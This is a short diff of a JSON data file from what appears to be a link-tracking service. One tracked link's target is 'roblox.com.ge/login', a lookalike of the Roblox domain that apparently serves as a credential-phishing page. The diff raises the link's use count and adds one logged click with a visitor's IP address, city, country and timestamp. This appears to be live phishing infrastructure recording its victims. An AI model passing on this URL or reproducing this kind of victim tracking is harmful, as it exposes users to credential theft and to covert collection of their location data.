@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 973,
+    "useCount": 974,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7904,6 +7904,14 @@
         "city": "Durban",
         "flag": "🇿🇦",
         "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777217101444,
+        "ip": "64.32.127.249",
+        "country": "Dominican Republic",
+        "city": "Santo Domingo",
+        "flag": "🇩🇴",
+        "countryCode": "DO"
       }
     ]
   },
